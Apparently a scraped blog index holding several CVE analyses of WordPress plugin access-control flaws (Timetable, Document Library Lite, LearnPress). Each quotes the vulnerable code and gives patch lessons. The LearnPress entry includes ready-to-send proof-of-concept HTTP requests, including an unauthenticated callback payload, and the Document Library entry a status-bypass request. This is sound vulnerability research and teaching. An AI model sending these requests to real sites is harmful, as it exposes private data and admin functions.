prefix are special hooks used to handle actions passed via the action parameter when accessing the post.php file. Specifically, when a user accesses a URL like: /wp-admin/post.php?post=post_id\u0026action=mptt_duplicate_event WordPress will call the post_action_mptt_duplicate_event callback to process the duplicate event logic. In addition to registering the action hook, the plugin also proactively creates a URL to trigger this action by adding a “Duplicate” link to the action list of each post in the admin dashboard. class-events.php v2.4.15 public function post_row_actions( $actions, $post ) { if ( $post-\u003epost_type == $this-\u003epost_type \u0026\u0026 current_user_can('edit_posts') ) { $action_url = add_query_arg( array( 'post' =\u003e $post-\u003eID, 'action' =\u003e 'mptt_duplicate_event', '_wpnonce' =\u003e wp_create_nonce( 'mptt_duplicate_event' ) ), admin_url( 'post.php' ) ); $actions['duplicate'] = '\u003ca href=\"' . $action_url . '\" aria-label=\"' . __('Duplicate', 'mp-timetable') . '\" rel=\"permalink\"\u003e' . __('Duplicate', 'mp-timetable') . '\u003c/a\u003e'; } return $actions; } This function uses the post_row_actions hook to add a Duplicate link to the action list of each post in the admin. The link is only displayed when the post matches the correct post_type and the user has edit_posts permissions (Contributor+). The generated URL points to post.php with post (Post ID), action (mptt_duplicate_event), and _wpnonce. When a user clicks Duplicate, WordPress will trigger the post_action_mptt_duplicate_event hook to process post duplication. Duplicate link in each Event Callback post_action_mptt_duplicate_event: class-events.php v2.4.15 public function post_action_mptt_duplicate_event( $post_id ) { global $wpdb; $post_type = ''; if ( $post_id ) { $post = get_post( $post_id ); } if ( $post ) { $post_type = $post-\u003epost_type; } if ( $post_type !== $this-\u003epost_type ) { wp_die( __( 'A post type mismatch has been detected.', 'mp-timetable' ), __( 'Sorry, you are not allowed to edit this item.', 'mp-timetable' ), 400 ); } $nonce = sanitize_key( $_REQUEST['_wpnonce'] ); if ( wp_verify_nonce( $nonce, 'mptt_duplicate_event' ) \u0026\u0026 current_user_can('edit_posts') ) { $current_user = wp_get_current_user(); $new_post_author = $current_user-\u003eID; /* * new post data array */ $args = array( 'comment_status' =\u003e $post-\u003ecomment_status, 'ping_status' =\u003e $post-\u003eping_status, 'post_author' =\u003e $new_post_author, 'post_content' =\u003e $post-\u003epost_content, 'post_excerpt' =\u003e $post-\u003epost_excerpt, 'post_name' =\u003e $post-\u003epost_name, 'post_parent' =\u003e $post-\u003epost_parent, 'post_password' =\u003e $post-\u003epost_password, 'post_status' =\u003e 'draft', // translators: New post title of the duplicated post 'post_title' =\u003e sprintf( __('%s - Copy', 'mp-timetable'), $post-\u003epost_title ), 'post_type' =\u003e $post-\u003epost_type, 'to_ping' =\u003e $post-\u003eto_ping, 'menu_order' =\u003e $post-\u003emenu_order ); /* * insert the post by wp_insert_post() function */ $new_post_id = wp_insert_post( $args ); if( is_wp_error($new_post_id) ) { wp_die( $post_id-\u003eget_error_message() ); } /* * get all current post terms and set them to the new post draft */ $taxonomies = get_object_taxonomies($post-\u003epost_type); foreach ($taxonomies as $taxonomy) { $post_terms = wp_get_object_terms($post_id, $taxonomy, array('fields' =\u003e 'slugs')); wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false); } /* * duplicate all post meta */ $post_meta_keys = \\get_post_custom_keys( $post_id ); if ( ! empty( $post_meta_keys ) ) { $meta_excludelist = [ '_edit_lock', '_edit_last', '_wp_old_slug' ]; $meta_keys = \\array_diff( $post_meta_keys, $meta_excludelist ); foreach ( $meta_keys as $meta_key ) { $meta_values = \\get_post_custom_values( $meta_key, $post_id ); // Clear existing meta data \\delete_post_meta( $new_post_id, $meta_key ); foreach ( $meta_values as $me","date":"2025-12-21","objectID":"/posts/2025-12-21-cve-2025-12954/:3:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-12954 Analysis \u0026 POC","uri":"/posts/2025-12-21-cve-2025-12954/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow flowchart TD A[\"Authenticated user (Contributor+)\"] --\u003e B[\"Click Duplicate link or craft URL manually\"] B --\u003e C[\"Request: /wp-admin/post.php?action=mptt_duplicate_event\u0026post={target_post_id}\"] C --\u003e D[\"WordPress loads post.php\"] D --\u003e E[\"do_action('post_action_mptt_duplicate_event', post_id)\"] E --\u003e F[\"post_action_mptt_duplicate_event(post_id)\"] F --\u003e G[\"get_post(post_id) without ownership check\"] G --\u003e H[\"Check nonce + current_user_can('edit_posts')\"] H --\u003e I[\"Permission granted (generic capability)\"] I --\u003e J[\"Duplicate target post (content, meta, taxonomy, custom table)\"] J --\u003e K[\"Create new draft owned by attacker\"] K --\u003e L[\"Redirect to edit screen of duplicated post\"] flowchart TD A[\"Authenticated user (Contributor+)\"] --\u003e B[\"Click Duplicate link or craft URL manually\"] B --\u003e C[\"Request: /wp-admin/post.php?action=mptt_duplicate_event\u0026post={target_post_id}\"] C --\u003e D[\"WordPress loads post.php\"] D --\u003e E[\"do_action('post_action_mptt_duplicate_event', post_id)\"] E --\u003e F[\"post_action_mptt_duplicate_event(post_id)\"] F --\u003e G[\"get_post(post_id) without ownership check\"] G --\u003e H[\"Check nonce + current_user_can('edit_posts')\"] H --\u003e I[\"Permission granted (generic capability)\"] I --\u003e J[\"Duplicate target post (content, meta, taxonomy, custom table)\"] J --\u003e K[\"Create new draft owned by attacker\"] K --\u003e L[\"Redirect to edit screen of duplicated post\"] flowchart TD A[\"Authenticated user (Contributor+)\"] --\u003e B[\"Click Duplicate link or craft URL manually\"] B --\u003e C[\"Request: /wp-admin/post.php?action=mptt_duplicate_event\u0026post={target_post_id}\"] C --\u003e D[\"WordPress loads post.php\"] D --\u003e E[\"do_action('post_action_mptt_duplicate_event', post_id)\"] E --\u003e F[\"post_action_mptt_duplicate_event(post_id)\"] F --\u003e G[\"get_post(post_id) without ownership check\"] G --\u003e H[\"Check nonce + current_user_can('edit_posts')\"] H --\u003e I[\"Permission granted (generic capability)\"] I --\u003e J[\"Duplicate target post (content, meta, taxonomy, custom table)\"] J --\u003e K[\"Create new draft owned by attacker\"] K --\u003e L[\"Redirect to edit screen of duplicated post\"] flowchart TD A[\"Authenticated user (Contributor+)\"] --\u003e B[\"Click Duplicate link or craft URL manually\"] B --\u003e C[\"Request: /wp-admin/post.php?action=mptt_duplicate_event\u0026post={target_post_id}\"] C --\u003e D[\"WordPress loads post.php\"] D --\u003e E[\"do_action('post_action_mptt_duplicate_event', post_id)\"] E --\u003e F[\"post_action_mptt_duplicate_event(post_id)\"] F --\u003e G[\"get_post(post_id) without ownership check\"] G --\u003e H[\"Check nonce + current_user_can('edit_posts')\"] H --\u003e I[\"Permission granted (generic capability)\"] I --\u003e J[\"Duplicate target post (content, meta, taxonomy, custom table)\"] J --\u003e K[\"Create new draft owned by attacker\"] K --\u003e L[\"Redirect to edit screen of duplicated post\"] ","date":"2025-12-21","objectID":"/posts/2025-12-21-cve-2025-12954/:4:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-12954 Analysis \u0026 POC","uri":"/posts/2025-12-21-cve-2025-12954/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Login with a Contributor account Access Timetable \u003e Events and click Duplicate on any event PoC ","date":"2025-12-21","objectID":"/posts/2025-12-21-cve-2025-12954/:5:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-12954 Analysis \u0026 POC","uri":"/posts/2025-12-21-cve-2025-12954/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability stems from the plugin only checking the general edit_posts permission when duplicating an event, instead of checking permissions on the specific post. Since the post_action_* hook is not automatically protected by WordPress, low-privileged users (Contributors) can change the post ID in the URL to duplicate events they do not own, leading to IDOR. The patch fixes this by using the edit_post meta capability, forcing WordPress to verify permissions on each post. ","date":"2025-12-21","objectID":"/posts/2025-12-21-cve-2025-12954/:6:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-12954 Analysis \u0026 POC","uri":"/posts/2025-12-21-cve-2025-12954/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways edit_posts is not suitable for protecting operations on specific posts Nonce is not a substitute for permission checks IDs taken from requests are always user-controlled Always use current_user_can( 'edit_post', $post_id ) when operating on a post The post_action_* hook requires the plugin to control authorization itself ","date":"2025-12-21","objectID":"/posts/2025-12-21-cve-2025-12954/:7:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-12954 Analysis \u0026 POC","uri":"/posts/2025-12-21-cve-2025-12954/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References IDOR WordPress Timetable and Event Schedule Plugin \u003c= 2.4.15 is vulnerable to Insecure Direct Object References (IDOR) ","date":"2025-12-21","objectID":"/posts/2025-12-21-cve-2025-12954/:8:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-12954 Analysis \u0026 POC","uri":"/posts/2025-12-21-cve-2025-12954/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Document Library Lite Plugin.","date":"2025-12-20","objectID":"/posts/2025-12-20-cve-2025-67985/","tags":["analyst","plugin","idor"],"title":"CVE-2025-67985 Analysis \u0026 POC","uri":"/posts/2025-12-20-cve-2025-67985/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info A vulnerability involving authorization bypass via user-controlled keys in the Document Library Lite plugin by Barn2 Plugins allows exploitation of misconfigured access control security levels. This vulnerability affects Document Library Lite from unknown versions up to version 1.1.7 and below. CVE ID: CVE-2025-67985 Vulnerability Type: Insecure direct object references (IDOR) Affected Versions: \u003c= 1.1.7 Patched Versions: 1.2.0 CVSS severity: Low (5.3) Required Privilege: Unauthenticated Product: WordPress Document Library Lite Plugin ","date":"2025-12-20","objectID":"/posts/2025-12-20-cve-2025-67985/:1:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-67985 Analysis \u0026 POC","uri":"/posts/2025-12-20-cve-2025-67985/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – Document Library Lite: 1.1.6 – vulnerable 1.2.0 – patched Diff Tool (diff) → Meld or any diff tool. Note The vulnerability is officially disclosed as affecting versions up to 1.1.7, but in reality it was already patched in version 1.1.7. We download version 1.1.6 for analysis. ","date":"2025-12-20","objectID":"/posts/2025-12-20-cve-2025-67985/:2:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-67985 Analysis \u0026 POC","uri":"/posts/2025-12-20-cve-2025-67985/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers the following action hook: Ajax_Handler.php v1.1.6 add_action( 'wp_ajax_nopriv_dll_load_posts', [ $this, 'load_posts' ] ); wp_ajax_nopriv_ is a hook available to all users (including unauthenticated users). Anyone can call the AJAX action: /wp-admin/admin-ajax.php?action=dll_load_posts And execute the load_posts() function: Ajax_Handler.php v1.1.6 const SHORTCODE = 'doc_library'; public function load_posts() { $args = Options::handle_shortcode_attribute_aliases( $_POST[ 'args' ] ); $args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE ); $table = new simple_Document_Library( $args ); $response = $table-\u003eget_table( 'array' ); // Return the response as JSON wp_send_json($response); } The load_posts() function calls handle_shortcode_attribute_aliases with user input from $_POST['args']: Options.php v1.1.6 public static function handle_shortcode_attribute_aliases( $atts ) { if ( isset( $atts['content'] ) ) { $atts['columns'] = $atts['content']; unset( $atts['content'] ); } if ( isset( $atts['docs_per_page'] ) ) { $atts['rows_per_page'] = $atts['docs_per_page']; unset( $atts['docs_per_page'] ); } return $atts; } This function only performs parameter mapping (renaming): content → columns docs_per_page → rows_per_page Then returns the $atts array. Next, load_posts() calls: $args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE ); to merge default parameters (Options::get_defaults()) with user-supplied $args: Default shortcode options Among them, status determines which document statuses are displayed. Document status can be changed when creating/editing a document: Change status pending and draft are non-public document statuses. Only users with sufficient privileges should be able to view them. load_posts() initializes simple_Document_Library with user-controlled $args: $table = new simple_Document_Library( $args ); validate_options() is called in the constructor of simple_Document_Library: public function __construct( $args ) { $this-\u003eargs = $this-\u003evalidate_options( $args ); $this-\u003eset_post_args(); } Here, not only the three statuses publish, pending, and draft exist, but also two additional statuses future and any, as seen in validate_options(): Simple_Document_Library.php v1.1.6 public function validate_options( $args ) { // Validate all the boolean options in the database $boolean_options = [ 'lazy_load', 'lightbox', 'wrap', 'search_on_click' ]; foreach( $boolean_options as $option ) { $args[ $option ] = is_string( $args[ $option ] ) ? $args[ $option ] === \"true\" : $args[ $option ]; } // The post status can only have these values $valid_post_statuses = [ 'publish', 'pending', 'draft', 'future', 'any' ]; $args[ 'status' ] = in_array( $args['status'], $valid_post_statuses ) ? $args[ 'status' ] : 'publish'; return $args; } This function only validates allowed values and does not perform any permission checks. Because status allows pending, draft, future, and any, a user can supply these values to view non-public documents → authorization bypass. $response = $table-\u003eget_table( 'array' ); get_table() is then called: Simple_Document_Library.php v1.1.6 public function get_table( $output_type = 'html' ) { $columns = $this-\u003eget_columns(); // Parse DataTables parameters from the AJAX request $draw = isset( $_POST['draw'] ) ? intval( $_POST['draw'] ) : 1; $this-\u003eargs['offset'] = isset( $_POST['start'] ) ? intval( $_POST['start'] ) : 0; $this-\u003eargs['rows_per_page'] = isset( $_POST['length'] ) \u0026\u0026 intval( $_POST['length'] ) !== -1 ? intval( $_POST['length'] ) : $this-\u003eargs['rows_per_page']; $this-\u003eargs['sort_by'] = isset( $_POST['order'] ) ? $columns[$_POST['order'][0]['column']] : $this-\u003eget_orderby(); $this-\u003eargs['sort_order'] = isset( $_POST['order'] ) ? $_POST['order'][0]['dir'] : $this-\u003eargs['sort_order']; $this-\u003eargs['search_value'] = isset( $_POST['search'] ) ? $_POST['search']['value'] : ''; $this-\u003eargs['rows_per_page'] = filter_var( $this-\u003eargs['rows_per_page'], FILTER_","date":"2025-12-20","objectID":"/posts/2025-12-20-cve-2025-67985/:3:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-67985 Analysis \u0026 POC","uri":"/posts/2025-12-20-cve-2025-67985/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow flowchart TD A[\"Unauthenticated user\"] --\u003e B[\"Send POST request to /wp-admin/admin-ajax.php?action=dll_load_posts with args[status]=pending|draft|future|any\"] B --\u003e C[\"wp_ajax_nopriv_dll_load_posts hook triggered\"] C --\u003e D[\"Ajax_Handler::load_posts()\"] D --\u003e E[\"Read user-controlled $_POST['args']\"] E --\u003e F[\"Options::handle_shortcode_attribute_aliases()\"] F --\u003e G[\"Merge with default options via shortcode_atts()\"] G --\u003e H[\"Initialize simple_Document_Library($args)\"] H --\u003e I[\"validate_options(): only validate value, no permission check\"] I --\u003e J[\"status accepted: publish/pending/draft/future/any\"] J --\u003e K[\"Build query using user-controlled status\"] K --\u003e L[\"Query documents including non-public ones\"] L --\u003e M[\"get_table('array')\"] M --\u003e N[\"wp_send_json(response)\"] N --\u003e O[\"Non-public documents returned to user\"] flowchart TD A[\"Unauthenticated user\"] --\u003e B[\"Send POST request to /wp-admin/admin-ajax.php?action=dll_load_posts with args[status]=pending|draft|future|any\"] B --\u003e C[\"wp_ajax_nopriv_dll_load_posts hook triggered\"] C --\u003e D[\"Ajax_Handler::load_posts()\"] D --\u003e E[\"Read user-controlled $_POST['args']\"] E --\u003e F[\"Options::handle_shortcode_attribute_aliases()\"] F --\u003e G[\"Merge with default options via shortcode_atts()\"] G --\u003e H[\"Initialize simple_Document_Library($args)\"] H --\u003e I[\"validate_options(): only validate value, no permission check\"] I --\u003e J[\"status accepted: publish/pending/draft/future/any\"] J --\u003e K[\"Build query using user-controlled status\"] K --\u003e L[\"Query documents including non-public ones\"] L --\u003e M[\"get_table('array')\"] M --\u003e N[\"wp_send_json(response)\"] N --\u003e O[\"Non-public documents returned to user\"] flowchart TD A[\"Unauthenticated user\"] --\u003e B[\"Send POST request to /wp-admin/admin-ajax.php?action=dll_load_posts with args[status]=pending|draft|future|any\"] B --\u003e C[\"wp_ajax_nopriv_dll_load_posts hook triggered\"] C --\u003e D[\"Ajax_Handler::load_posts()\"] D --\u003e E[\"Read user-controlled $_POST['args']\"] E --\u003e F[\"Options::handle_shortcode_attribute_aliases()\"] F --\u003e G[\"Merge with default options via shortcode_atts()\"] G --\u003e H[\"Initialize simple_Document_Library($args)\"] H --\u003e I[\"validate_options(): only validate value, no permission check\"] I --\u003e J[\"status accepted: publish/pending/draft/future/any\"] J --\u003e K[\"Build query using user-controlled status\"] K --\u003e L[\"Query documents including non-public ones\"] L --\u003e M[\"get_table('array')\"] M --\u003e N[\"wp_send_json(response)\"] N --\u003e O[\"Non-public documents returned to user\"] flowchart TD A[\"Unauthenticated user\"] --\u003e B[\"Send POST request to /wp-admin/admin-ajax.php?action=dll_load_posts with args[status]=pending|draft|future|any\"] B --\u003e C[\"wp_ajax_nopriv_dll_load_posts hook triggered\"] C --\u003e D[\"Ajax_Handler::load_posts()\"] D --\u003e E[\"Read user-controlled $_POST['args']\"] E --\u003e F[\"Options::handle_shortcode_attribute_aliases()\"] F --\u003e G[\"Merge with default options via shortcode_atts()\"] G --\u003e H[\"Initialize simple_Document_Library($args)\"] H --\u003e I[\"validate_options(): only validate value, no permission check\"] I --\u003e J[\"status accepted: publish/pending/draft/future/any\"] J --\u003e K[\"Build query using user-controlled status\"] K --\u003e L[\"Query documents including non-public ones\"] L --\u003e M[\"get_table('array')\"] M --\u003e N[\"wp_send_json(response)\"] N --\u003e O[\"Non-public documents returned to user\"] ","date":"2025-12-20","objectID":"/posts/2025-12-20-cve-2025-67985/:4:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-67985 Analysis \u0026 POC","uri":"/posts/2025-12-20-cve-2025-67985/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send request: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost action=dll_load_posts\u0026args[status]=any Result: Result ","date":"2025-12-20","objectID":"/posts/2025-12-20-cve-2025-67985/:5:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-67985 Analysis \u0026 POC","uri":"/posts/2025-12-20-cve-2025-67985/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability occurs because a public AJAX endpoint trusts the client-controlled status parameter and directly uses it to query documents without performing permission checks. This allows unauthenticated users to access non-public documents, resulting in an authorization bypass / IDOR. ","date":"2025-12-20","objectID":"/posts/2025-12-20-cve-2025-67985/:6:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-67985 Analysis \u0026 POC","uri":"/posts/2025-12-20-cve-2025-67985/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Validation does not replace authorization wp_ajax_nopriv_* is a public attack surface Query-affecting parameters must be bound to user permissions Returning JSON without permission checks can cause data leakage ","date":"2025-12-20","objectID":"/posts/2025-12-20-cve-2025-67985/:7:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-67985 Analysis \u0026 POC","uri":"/posts/2025-12-20-cve-2025-67985/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References IDOR WordPress Document Library Lite Plugin \u003c= 1.1.7 is vulnerable to Insecure Direct Object References (IDOR) ","date":"2025-12-20","objectID":"/posts/2025-12-20-cve-2025-67985/:8:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-67985 Analysis \u0026 POC","uri":"/posts/2025-12-20-cve-2025-67985/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress LearnPress Plugin.","date":"2025-12-16","objectID":"/posts/2025-12-16-cve-2025-13956/","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-13956 Analysis \u0026 POC","uri":"/posts/2025-12-16-cve-2025-13956/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The LearnPress – WordPress LMS Plugin for WordPress is affected by an unauthorized data access vulnerability due to a lack of capability checks in the statistics function in all versions up to and including 4.3.1. This allows unauthenticated attackers to view the plugin’s order statistics, including total revenue and order status counts. CVE ID: CVE-2025-13956 Vulnerability Type: Broken Access Control Affected Versions: \u003c= 4.3.1 Patched Versions: 4.3.2 CVSS severity: Low (5.3) Required Privilege: Unauthenticated Product: WordPress LearnPress Plugin ","date":"2025-12-16","objectID":"/posts/2025-12-16-cve-2025-13956/:1:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-13956 Analysis \u0026 POC","uri":"/posts/2025-12-16-cve-2025-13956/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - LearnPress: 4.3.1 – vulnerable * 4.3.2 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-16","objectID":"/posts/2025-12-16-cve-2025-13956/:2:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-13956 Analysis \u0026 POC","uri":"/posts/2025-12-16-cve-2025-13956/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registered an action hook: learnpress.php v4.3.1 add_action( 'init', function () { LoadContentViaAjax::catch_lp_ajax(); LessonAjax::catch_lp_ajax(); EditCurriculumAjax::catch_lp_ajax(); EditQuizAjax::catch_lp_ajax(); EditQuestionAjax::catch_lp_ajax(); SendEmailAjax::catch_lp_ajax(); OpenAiAjax::catch_lp_ajax(); do_action( 'learn-press/register-ajax-handlers' ); }, 11 ); The init hook is an early initialization hook in WordPress, which runs after WordPress has finished loading core components but before sending output to the browser =\u003e Any request from any user can trigger it. function () {} is an anonymous function set as the callback for this hook. On line 4, the static function LoadContentViaAjax:catch_lp_ajax() is called from the LoadContentViaAjax class: AbstractAjax.php v4.3.1 class LoadContentViaAjax extends AbstractAjax { ... } abstract class AbstractAjax { public static function catch_lp_ajax() { if ( ! empty( $_REQUEST['lp-load-ajax'] ) ) { $action = $_REQUEST['lp-load-ajax']; $nonce = $_REQUEST['nonce'] ?? ''; $class = new static(); // For case cache html, so cache nonce is not required. $class_no_nonce = [ LoadContentViaAjax::class, ]; if ( ! wp_verify_nonce( $nonce, 'wp_rest' ) ) { if ( ! in_array( get_class( $class ), $class_no_nonce ) ) { wp_die( 'Invalid request!', 400 ); } else { // Allow to handle without nonce, but must same domain. $referer = wp_get_referer(); if ( empty( $referer ) || strpos( $referer, home_url() ) !== 0 ) { wp_die( 'Invalid request!', 400 ); } } } if ( is_callable( [ $class, $action ] ) ) { call_user_func( [ $class, $action ] ); } } } } Inherited Class class LoadContentViaAjax extends AbstractAjax → LoadContentViaAjax inherits all AJAX processing logic from AbstractAjax. 2. **Hook init calls catch_lp_ajax()** When WordPress reaches the init hook LoadContentViaAjax::catch_lp_ajax() is executed. Request Check if ( ! empty( $_REQUEST['lp-load-ajax'] ) ) → Only processes when the request has the lp-load-ajax parameter. 4. Action Determination $action = $_REQUEST['lp-load-ajax']; → This value is treated as the method name to be called in the child class. 5. Object Initialization $class = new static(); → static refers to the class currently being called (LoadContentViaAjax), so it creates an instance of that class. 6. Nonce Handling Retrieves nonce from the request Checks it using wp_verify_nonce Specifically, LoadContentViaAjax is allowed to bypass the nonce When bypassing the nonce, it checks if the referer is from the same domain. Call Corresponding Method if ( is_callable( [ $class, $action ] ) ) { call_user_func( [ $class, $action ] ); } → If LoadContentViaAjax has a method with the same name as the lp-load-ajax value → That method will be called and executed. AbstractAjax.php v4.3.1 class LoadContentViaAjax extends AbstractAjax { public function load_content_via_ajax() { $response = new LP_REST_Response(); try { $params = wp_unslash( $_REQUEST['data'] ?? '' ); if ( empty( $params ) ) { throw new Exception( 'Error: params invalid!' ); } $params = LP_Helper::json_decode( $params, true ); if ( empty( $params['callback'] ) || ! isset( $params['args'] ) ) { throw new Exception( 'Error: params invalid!' ); } // @var array $args $args = $params['args']; $callBack = $params['callback']; if ( empty( $callBack['class'] ) || empty( $callBack['method'] ) ) { throw new Exception( 'Error: callback invalid!' ); } $class = $callBack['class']; $method = $callBack['method']; // Security: check callback is registered. $allow_callbacks = apply_filters( 'lp/rest/ajax/allow_callback', [] ); $callBackStr = $class . ':' . $method; if ( ! in_array( $callBackStr, $allow_callbacks ) ) { throw new Exception( 'Error: callback is not register!' ); } // Check class and method is callable. if ( is_callable( [ $class, $method ] ) ) { $data = call_user_func( [ $class, $method ], $args ); } else { throw new Exception( 'Error: callback is not callable!' ); } if ( ! $data instanceof stdClass \u0026\u0026 ! isset( $d","date":"2025-12-16","objectID":"/posts/2025-12-16-cve-2025-13956/:3:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-13956 Analysis \u0026 POC","uri":"/posts/2025-12-16-cve-2025-13956/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow flowchart TD A[\"Unauthenticated attacker\"] --\u003e B[\"Send request with lp-load-ajax parameter\"] B --\u003e C[\"LoadContentViaAjax::catch_lp_ajax() triggered via init hook\"] C --\u003e D[\"Check lp-load-ajax parameter exists\"] D --\u003e E[\"Create instance of LoadContentViaAjax\"] E --\u003e F[\"Class in $class_no_nonce whitelist → Skip nonce check\"] F --\u003e G[\"Retrieve $class and $method from request data\"] G --\u003e H[\"Check if $class:$method is in $allow_callbacks (all callbacks allowed)\"] H --\u003e I[\"is_callable([class, method])?\"] I --\u003e|Yes| J[\"Execute callback via call_user_func([class, method], args)\"] J --\u003e K[\"Sensitive admin-only data returned to attacker\"] flowchart TD A[\"Unauthenticated attacker\"] --\u003e B[\"Send request with lp-load-ajax parameter\"] B --\u003e C[\"LoadContentViaAjax::catch_lp_ajax() triggered via init hook\"] C --\u003e D[\"Check lp-load-ajax parameter exists\"] D --\u003e E[\"Create instance of LoadContentViaAjax\"] E --\u003e F[\"Class in $class_no_nonce whitelist → Skip nonce check\"] F --\u003e G[\"Retrieve $class and $method from request data\"] G --\u003e H[\"Check if $class:$method is in $allow_callbacks (all callbacks allowed)\"] H --\u003e I[\"is_callable([class, method])?\"] I --\u003e|Yes| J[\"Execute callback via call_user_func([class, method], args)\"] J --\u003e K[\"Sensitive admin-only data returned to attacker\"] flowchart TD A[\"Unauthenticated attacker\"] --\u003e B[\"Send request with lp-load-ajax parameter\"] B --\u003e C[\"LoadContentViaAjax::catch_lp_ajax() triggered via init hook\"] C --\u003e D[\"Check lp-load-ajax parameter exists\"] D --\u003e E[\"Create instance of LoadContentViaAjax\"] E --\u003e F[\"Class in $class_no_nonce whitelist → Skip nonce check\"] F --\u003e G[\"Retrieve $class and $method from request data\"] G --\u003e H[\"Check if $class:$method is in $allow_callbacks (all callbacks allowed)\"] H --\u003e I[\"is_callable([class, method])?\"] I --\u003e|Yes| J[\"Execute callback via call_user_func([class, method], args)\"] J --\u003e K[\"Sensitive admin-only data returned to attacker\"] flowchart TD A[\"Unauthenticated attacker\"] --\u003e B[\"Send request with lp-load-ajax parameter\"] B --\u003e C[\"LoadContentViaAjax::catch_lp_ajax() triggered via init hook\"] C --\u003e D[\"Check lp-load-ajax parameter exists\"] D --\u003e E[\"Create instance of LoadContentViaAjax\"] E --\u003e F[\"Class in $class_no_nonce whitelist → Skip nonce check\"] F --\u003e G[\"Retrieve $class and $method from request data\"] G --\u003e H[\"Check if $class:$method is in $allow_callbacks (all callbacks allowed)\"] H --\u003e I[\"is_callable([class, method])?\"] I --\u003e|Yes| J[\"Execute callback via call_user_func([class, method], args)\"] J --\u003e K[\"Sensitive admin-only data returned to attacker\"] ","date":"2025-12-16","objectID":"/posts/2025-12-16-cve-2025-13956/:4:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-13956 Analysis \u0026 POC","uri":"/posts/2025-12-16-cve-2025-13956/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send a request with an Unauthenticated user: POST / HTTP/1.1 Host: localhost Referer: http://localhost lp-load-ajax=load_content_via_ajax\u0026data={\"callback\":{\"class\":\"LearnPress\\\\TemplateHooks\\\\Admin\\\\AdminEditQizTemplate\",\"method\":\"render_list_items_not_assign\"},\"args\":{\"quiz_id\":483}} Other valid callback lists: LearnPress\\TemplateHooks\\Course\\ListCoursesTemplate:render_courses LearnPress\\TemplateHooks\\Course\\ListCoursesRelatedTemplate:render_courses LearnPress\\TemplateHooks\\Course\\SingleCourseTemplate:render_html_comments LearnPress\\TemplateHooks\\Profile\\ProfileQuizzesTemplate:renderContent LearnPress\\TemplateHooks\\Course\\AdminEditCurriculumTemplate:render_edit_course_curriculum LearnPress\\TemplateHooks\\Course\\AdminEditCurriculumTemplate:render_list_items_not_assign LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate:render_edit_quiz LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate:render_list_items_not_assign LearnPress\\TemplateHooks\\Admin\\AdminEditQuestionTemplate:render_edit_question LearnPress\\TemplateHooks\\Course\\CourseMaterialTemplate:render_material_items LearnPress\\ExternalPlugin\\Elementor\\Widgets\\Course\\Skins\\CoursesGrid:render_courses LearnPress\\ExternalPlugin\\Elementor\\Widgets\\Course\\Skins\\CoursesList:render_courses LearnPress\\ExternalPlugin\\Elementor\\Widgets\\Course\\Skins\\CoursesLoopItem:render_courses LearnPress\\Gutenberg\\Blocks\\Courses\\ListCoursesBlockType:render_courses ","date":"2025-12-16","objectID":"/posts/2025-12-16-cve-2025-13956/:5:0","tags":["analyst","plugin","broken access control"],"title":"CVE-2025-13956 Analysis \u0026 POC","uri":"/posts/2025-12-16-cve-2025-13956/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The Broken Access Control vulnerability in LearnPress \u003c= 4.3.1 allows unauthenticated attackers to execute AJAX callbacks that were intended only for admins. The issue occurs because the API does not check capability/permission before calling call_user_func([class, method], args). Patch 4.3.2 has limited the valid callbacks and requires Administrator privileges, preventing unauthorized access. ","date":"2025-12-16","objectID":"/posts/2025-12-16-cve-2025-13956/:6:0","tags":["analyst","plugin","broken access 